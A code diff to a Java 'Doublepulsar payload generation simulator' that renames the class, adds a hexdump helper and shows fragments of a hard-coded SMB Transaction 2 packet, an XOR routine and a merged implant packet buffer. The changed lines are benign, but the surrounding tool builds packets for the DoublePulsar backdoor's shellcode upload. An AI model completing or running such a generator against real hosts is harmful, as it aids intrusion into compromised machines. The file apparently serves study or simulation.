@@ -8,7 +8,7 @@ import java.io.UnsupportedEncodingException;
 Doublepulsar payload generation simulator
 */
 
-public class DoublepulsarUploadShellcode {
+public class Main {
     
     public static byte[] trans2_exec = new byte[] {
 
@@ -18,6 +18,42 @@ public class DoublepulsarUploadShellcode {
         (byte)0x00,(byte)0x25,(byte)0x89,(byte)0x1a,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x0c,(byte)0x00,(byte)0x42,(byte)0x00,(byte)0x00,(byte)0x10,(byte)0x4e,(byte)0x00,(byte)0x01,
         (byte)0x00,(byte)0x0e,(byte)0x00,(byte)0x0d,(byte)0x10,(byte)0x00 
     };
+    
+    public static String xxd(byte[] data) {
+    StringBuilder sb = new StringBuilder();
+    int len = data.length;
+    
+    for (int i = 0; i < len; i += 16) {
+        // Print offset
+        sb.append(String.format("%04X: ", i));
+        
+        // Print hex values
+        for (int j = 0; j < 16; j++) {
+            if (i + j < len) {
+                sb.append(String.format("%02X ", data[i + j]));
+            } else {
+                sb.append("   "); // padding if line is short
+            }
+            if (j == 7) sb.append(" "); // extra space in the middle
+        }
+        
+        sb.append(" |");
+        
+        // Print ASCII characters
+        for (int j = 0; j < 16 && (i + j) < len; j++) {
+            byte b = data[i + j];
+            if (b >= 32 && b <= 126) {
+                sb.append((char) b);
+            } else {
+                sb.append(".");
+            }
+        }
+        
+        sb.append("|\n");
+    }
+    
+    return sb.toString();
+}
         
     public static byte[] byteXor(byte[] data, byte[] keyBytes) {
     byte[] result = new byte[data.length];
@@ -304,11 +340,10 @@ public class DoublepulsarUploadShellcode {
         // Print out the merged array to verify (Optional)
         System.out.println("Merged byte array length: " + doublepulsar_packet.length);
     
-    
         System.out.println("Hexdump of transaction 2 packet:  ");
-        System.out.println(hexdump(trans2_exec));
+        System.out.println(xxd(trans2_exec));
         
          System.out.println("Hexdump of byte buffer:  ");
-        System.out.println(hexdump(doublepulsar_packet));
+        System.out.println(xxd(doublepulsar_packet));
     }
 }
